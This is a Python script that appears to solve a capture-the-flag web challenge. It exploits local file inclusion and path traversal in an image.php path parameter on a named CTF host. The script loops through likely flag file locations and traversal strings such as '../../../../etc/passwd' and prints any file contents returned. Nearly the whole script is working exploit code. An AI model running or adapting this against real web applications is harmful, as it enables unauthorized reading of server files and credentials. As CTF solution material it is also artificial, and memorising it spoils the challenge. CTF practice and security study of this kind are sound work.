#!/usr/bin/env python3
import requests, re

BASE = 'https://shopping-l1-ctf.tdho.st'
s = requests.Session()

# LFI via /image.php?path=
# Try common flag locations
paths = [
    '/tmp/flag.txt',
    '/flag.txt',
    '/flag',
    '/var/www/html/flag.txt',
    '/var/www/flag.txt',
    '/etc/flag.txt',
    '/root/flag.txt',
    '/var/www/html/flag',
]

for p in paths:
    r = s.get(BASE + f'/image.php?path={p}')
    if r.status_code == 200 and len(r.content) > 0:
        text = r.content.decode('utf-8', errors='ignore')
        if 'TDHT{' in text:
            flag = re.search(r'TDHT\{[^}]+\}', text)
            print(f"FLAG FOUND at {p}: {flag.group(0)}")
            exit()
        elif len(text) > 0 and 'PNG' not in text[:10]:
            print(f"{p}: {text[:200]}")

# Also try path traversal
traversal_paths = [
    '../../../../tmp/flag.txt',
    '../../../../flag.txt',
    '../../../../etc/passwd',
    '../flag.txt',
    '../../flag.txt',
]

for p in traversal_paths:
    r = s.get(BASE + f'/image.php?path={p}')
    if r.status_code == 200 and len(r.content) > 0:
        text = r.content.decode('utf-8', errors='ignore')
        if 'TDHT{' in text:
            flag = re.search(r'TDHT\{[^}]+\}', text)
            print(f"FLAG FOUND at {p}: {flag.group(0)}")
            exit()
        elif len(text) > 0 and 'PNG' not in text[:10]:
            print(f"{p}: {text[:100]}")
